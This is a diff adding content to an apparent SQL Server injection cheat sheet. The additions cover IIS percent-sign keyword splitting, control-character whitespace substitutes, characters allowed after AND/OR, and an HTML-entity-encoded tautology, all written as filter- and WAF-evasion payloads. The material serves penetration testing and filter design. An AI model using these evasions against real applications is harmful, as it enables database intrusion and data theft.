@@ -31,7 +31,7 @@ SELECT CHAR(10) username FROM users
 
 SQL Server is flexible with whitespace, allowing creative formatting:
 
-```sql
+````sql
 -- Using tabs, newlines, and carriage returns
 SELECT
 username
@@ -43,6 +43,86 @@ SELECT%A0username%A0FROM%A0users
 
 -- Excessive whitespace
 SELECT       username       FROM       users
+
+### IIS/ASP Specific Obfuscation
+In ASP(x) applications, percentage signs can be placed between characters to bypass filters, as IIS strips them before passing the query to the database:
+
+```sql
+-- "SELECT" with % signs
+S%E%L%E%C%T column FROM table
+
+-- "AND 1=1" with % signs (and multiple % signs)
+A%%ND 1=%%%%%%%%1
+````
+
+### Allowed Intermediary Characters (Whitespace)
+
+The following characters can be used instead of spaces:
+
+| Hex   | Description          |
+| ----- | -------------------- |
+| `%01` | Start of Heading     |
+| `%02` | Start of Text        |
+| `%03` | End of Text          |
+| `%04` | End of Transmission  |
+| `%05` | Enquiry              |
+| `%06` | Acknowledge          |
+| `%07` | Bell                 |
+| `%08` | Backspace            |
+| `%09` | Horizontal Tab       |
+| `%0A` | New Line             |
+| `%0B` | Vertical Tab         |
+| `%0C` | Form Feed            |
+| `%0D` | Carriage Return      |
+| `%0E` | Shift Out            |
+| `%0F` | Shift In             |
+| `%10` | Data Link Escape     |
+| `%11` | Device Control 1     |
+| `%12` | Device Control 2     |
+| `%13` | Device Control 3     |
+| `%14` | Device Control 4     |
+| `%15` | Negative Acknowledge |
+| `%16` | Synchronous Idle     |
+| `%17` | End of Trans. Block  |
+| `%18` | Cancel               |
+| `%19` | End of Medium        |
+| `%1A` | Substitute           |
+| `%1B` | Escape               |
+| `%1C` | File Separator       |
+| `%1D` | Group Separator      |
+| `%1E` | Record Separator     |
+| `%1F` | Unit Separator       |
+| `%20` | Space                |
+| `%25` | Percent Sign         |
+
+### Characters Avoiding Spaces
+
+These characters can replace spaces in certain contexts:
+
+| Character | Description  | Example                                                |
+| --------- | ------------ | ------------------------------------------------------ |
+| `"`       | Double quote | `SELECT"column"FROM"table"`                            |
+| `(` `)`   | Parentheses  | `UNION(SELECT(column)FROM(table))`                     |
+| `[` `]`   | Brackets     | `SELECT[column_name]FROM[information_schema].[tables]` |
+
+### Characters After AND/OR
+
+The following characters can appear immediately after AND/OR:
+
+| Hex       | Character | Description   |
+| --------- | --------- | ------------- |
+| `%01-%20` | Various   | Control chars |
+| `%21`     | `!`       | Exclamation   |
+| `%2B`     | `+`       | Plus          |
+| `%2D`     | `-`       | Minus         |
+| `%2E`     | `.`       | Period        |
+| `%5C`     | `\`       | Backslash     |
+| `%7E`     | `~`       | Tilde         |
+
+Example:
+
+```sql
+SELECT 1 FROM[table]WHERE\1=\1AND\1=\1
 ```
 
 ### Case Variation
@@ -62,6 +142,7 @@ Some operators have alternative representations:
 -- OR alternatives
 1 OR 1=1
 1 || 1=1  -- Works if ANSI_NULLS is OFF
+
 
 -- AND alternatives
 1 AND 1=1
@@ -158,6 +239,10 @@ SELECT%2520*%2520FROM%2520users
 
 -- Unicode-wide characters
 SELECT+%u0055NION+%u0053ELECT+1,2,3--
+
+-- HTML Entities (for web contexts)
+-- AND 1=1 as HTML entities:
+%26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B
 ```
 
 #### Breaking Up Keywords
